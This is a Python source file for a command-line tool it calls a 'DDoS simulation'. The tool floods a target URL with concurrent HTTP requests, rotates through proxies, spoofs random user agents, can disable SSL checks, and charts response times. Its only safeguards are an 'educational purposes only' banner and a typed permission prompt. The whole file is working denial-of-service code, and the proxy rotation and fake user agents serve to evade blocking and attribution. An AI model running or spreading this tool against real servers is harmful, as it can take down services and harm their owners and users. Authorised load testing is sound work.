import asyncio
import aiohttp
import time
import random
import argparse
import json
import logging
from faker import Faker
from dataclasses import dataclass
from typing import Dict, List, Optional, Union
from tqdm.asyncio import tqdm
import matplotlib.pyplot as plt
from colorama import init, Fore, Style
import sys
import aiohttp_socks

# Initialize colorama
init()

# Setup logging
logging.basicConfig(filename="ddos_simulation.log", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s", filemode='a')

fake = Faker()

@dataclass
class AttackProfile:
    name: str
    methods: List[str]
    headers: Dict[str, Union[str, callable]]
    payload_generator: callable
    delay_variance: float
    rate_limit: float

    def generate_request(self, request_id: int, url: str, proxies: Optional[List[str]] = None) -> Dict:
        method = random.choice(self.methods)
        headers = {k: v() if callable(v) else v for k, v in self.headers.items()}
        payload = self.payload_generator()
        proxy = random.choice(proxies) if proxies else None
        return {
            "id": request_id,
            "method": method,
            "url": url,
            "headers": headers,
            "payload": payload,
            "delay_variance": self.delay_variance,
            "rate_limit": self.rate_limit,
            "proxy": proxy
        }

DEFAULT_PROFILES = {
    "normal": AttackProfile(
        name="Normal Traffic",
        methods=["GET"],
        headers={"User-Agent": lambda: fake.user_agent(), "Accept": "*/*"},
        payload_generator=lambda: None,
        delay_variance=0.1,
        rate_limit=0.1
    ),
    "api_stress": AttackProfile(
        name="API Stress",
        methods=["POST", "PUT"],
        headers={"User-Agent": lambda: fake.user_agent(), "Content-Type": "application/json"},
        payload_generator=lambda: json.dumps({"id": random.randint(1, 1000), "data": fake.text(max_nb_chars=200)}),
        delay_variance=0.05,
        rate_limit=0.05
    )
}

class Metrics:
    def __init__(self):
        self.success = 0
        self.failure = 0
        self.response_times = []
        self.status_codes = {}
        self.errors = {"timeout": 0, "connection": 0, "other": 0}
        self.lock = asyncio.Lock()

    async def record(self, success: bool, response_time: float, status_code: Optional[int] = None, error_type: Optional[str] = None):
        async with self.lock:
            if success:
                self.success += 1
            else:
                self.failure += 1
                if error_type:
                    self.errors[error_type] = self.errors.get(error_type, 0) + 1
            self.response_times.append(response_time)
            if status_code:
                self.status_codes[status_code] = self.status_codes.get(status_code, 0) + 1

    def summary(self) -> Dict:
        total = self.success + self.failure
        avg_time = sum(self.response_times) / len(self.response_times) if self.response_times else 0
        return {
            "total_requests": total,
            "successful_requests": self.success,
            "failed_requests": self.failure,
            "success_rate": (self.success / total) * 100 if total > 0 else 0,
            "avg_response_time": avg_time,
            "min_response_time": min(self.response_times or [0]),
            "max_response_time": max(self.response_times or [0]),
            "response_times": self.response_times,
            "status_codes": self.status_codes,
            "errors": self.errors
        }

def plot_metrics(metrics: Dict, output_file: str = "attack_response_times.png"):
    fig, ax = plt.subplots(figsize=(12, 6))
    ax.hist(metrics["response_times"], bins=30, color='red', alpha=0.7, edgecolor='black')
    ax.set_title("Response Time Distribution")
    ax.set_xlabel("Time (seconds)")
    ax.set_ylabel("Frequency")
    ax.grid(True, alpha=0.3)
    plt.savefig(output_file)
    print(f"{Fore.GREEN}Plot saved as '{output_file}'{Style.RESET_ALL}")

async def validate_proxy(proxy: str, timeout: int = 5) -> bool:
    """Validate if a proxy is reachable."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://www.google.com", proxy=proxy, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                return resp.status == 200
    except Exception:
        return False

async def send_request(session: aiohttp.ClientSession, req: Dict, metrics: Metrics, semaphore: asyncio.Semaphore, progress: tqdm, verbose: bool = False):
    async with semaphore:
        try:
            start_time = time.time()
            async with session.request(
                method=req["method"],
                url=req["url"],
                headers=req["headers"],
                data=req["payload"],
                timeout=aiohttp.ClientTimeout(total=5),
                proxy=req["proxy"],
                ssl=False if req["url"].startswith("https") and not args.ssl_verify else True  # SSL option
            ) as response:
                elapsed_time = time.time() - start_time
                success = response.status in (200, 201)
                await metrics.record(success, elapsed_time, response.status)
                log_msg = f"Request {req['id']}: {req['method']} {req['url']} - Status {response.status} - Time {elapsed_time:.3f}s"
                logging.info(log_msg)
                if verbose:
                    print(f"{Fore.GREEN}{log_msg}{Style.RESET_ALL}")
        except asyncio.TimeoutError:
            elapsed_time = time.time() - start_time
            await metrics.record(False, elapsed_time, error_type="timeout")
            log_msg = f"Request {req['id']}: {req['method']} {req['url']} - Timeout"
            logging.error(log_msg)
            if verbose:
                print(f"{Fore.RED}{log_msg}{Style.RESET_ALL}")
        except (aiohttp.ClientError, aiohttp_socks.SocksError) as e:
            elapsed_time = time.time() - start_time
            await metrics.record(False, elapsed_time, error_type="connection")
            log_msg = f"Request {req['id']}: {req['method']} {req['url']} - Failed - Error: {str(e)}"
            logging.error(log_msg)
            if verbose:
                print(f"{Fore.RED}{log_msg}{Style.RESET_ALL}")
        except Exception as e:
            elapsed_time = time.time() - start_time
            await metrics.record(False, elapsed_time, error_type="other")
            log_msg = f"Request {req['id']}: {req['method']} {req['url']} - Failed - Error: {str(e)}"
            logging.error(log_msg)
            if verbose:
                print(f"{Fore.RED}{log_msg}{Style.RESET_ALL}")
        finally:
            progress.update(1)
            await asyncio.sleep(req["rate_limit"] + random.uniform(0, req["delay_variance"]))

async def run_attack(url: str, request_count: int, concurrency: int, profile_name: str, rate_limit: Optional[float] = None, proxies: Optional[List[str]] = None, verbose: bool = False):
    metrics = Metrics()
    profile = DEFAULT_PROFILES.get(profile_name, DEFAULT_PROFILES["normal"])
    if rate_limit is not None:  # Override profile rate limit if provided
        profile.rate_limit = rate_limit

    # Validate proxies if provided
    valid_proxies = proxies
    if proxies:
        print(f"{Fore.YELLOW}Validating proxies...{Style.RESET_ALL}")
        proxy_tasks = [validate_proxy(proxy) for proxy in proxies]
        results = await asyncio.gather(*proxy_tasks)
        valid_proxies = [proxy for proxy, valid in zip(proxies, results) if valid]
        if not valid_proxies:
            print(f"{Fore.RED}No valid proxies found. Proceeding without proxies.{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}Valid proxies: {len(valid_proxies)}/{len(proxies)}{Style.RESET_ALL}")

    requests_list = [profile.generate_request(i, url, valid_proxies) for i in range(1, request_count + 1)]
    semaphore = asyncio.Semaphore(concurrency)

    print(f"{Fore.CYAN}\nStarting DDoS simulation on {url}{Style.RESET_ALL}")
    print(f"Profile: {profile.name}, Requests: {request_count}, Concurrency: {concurrency}, Rate Limit: {profile.rate_limit}s")

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0)) as session:
        with tqdm(total=request_count, desc="Attack Progress", unit="req", colour="green") as progress:
            tasks = [send_request(session, req, metrics, semaphore, progress, verbose) for req in requests_list]
            await asyncio.gather(*tasks)

    return metrics

def execute_attack(url: str, request_count: int, concurrency: int, profile_name: str, rate_limit: Optional[float], proxies: Optional[List[str]], verbose: bool, ssl_verify: bool):
    global args  # Store args globally for access in send_request
    args = argparse.Namespace(url=url, ssl_verify=ssl_verify)
    start_time = time.time()
    try:
        metrics = asyncio.run(run_attack(url, request_count, concurrency, profile_name, rate_limit, proxies, verbose))
    except Exception as e:
        print(f"{Fore.RED}Attack failed: {str(e)}{Style.RESET_ALL}")
        logging.critical(f"Attack execution failed: {str(e)}")
        return

    total_time = time.time() - start_time
    summary = metrics.summary()

    print(f"\n{Fore.YELLOW}=== DDoS Simulation Summary ==={Style.RESET_ALL}")
    for key, value in summary.items():
        if key not in ("response_times", "status_codes", "errors"):
            print(f"{key.replace('_', ' ').title()}: {value:.2f}" if isinstance(value, float) else f"{key.replace('_', ' ').title()}: {value}")
    print(f"Errors: {summary['errors']}")
    print(f"Total Time Taken: {total_time:.2f}s")
    plot_metrics(summary)

def main():
    parser = argparse.ArgumentParser(description="DDoS Simulation Tool", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--requests", type=int, default=500, help="Number of requests")
    parser.add_argument("--concurrency", type=int, default=50, help="Concurrent connections")
    parser.add_argument("--profile", default="normal", help="Attack profile")
    parser.add_argument("--rate-limit", type=float, help="Override profile rate limit (seconds)")
    parser.add_argument("--proxies", nargs="*", help="List of proxy URLs")
    parser.add_argument("--verbose", action="store_true", help="Show detailed request output")
    parser.add_argument("--no-ssl-verify", action="store_true", help="Disable SSL verification (use with caution)")

    args = parser.parse_args()

    print(f"{Fore.RED}\nWARNING: This tool is for EDUCATIONAL PURPOSES ONLY.{Style.RESET_ALL}")
    print("Use it only on servers you own or have explicit permission to test.")
    print("Unauthorized use is illegal and unethical.\n")

    if args.no_ssl_verify:
        print(f"{Fore.YELLOW}WARNING: SSL verification disabled. This may expose you to security risks.{Style.RESET_ALL}")

    confirm = input(f"{Fore.YELLOW}Do you have permission to test {args.url}? (yes/no): {Style.RESET_ALL}")
    if confirm.lower() != "yes":
        print(f"{Fore.RED}Aborting simulation.{Style.RESET_ALL}")
        sys.exit(1)

    execute_attack(args.url, args.requests, args.concurrency, args.profile, args.rate_limit, args.proxies, args.verbose, not args.no_ssl_verify)

if __name__ == "__main__":
    main()
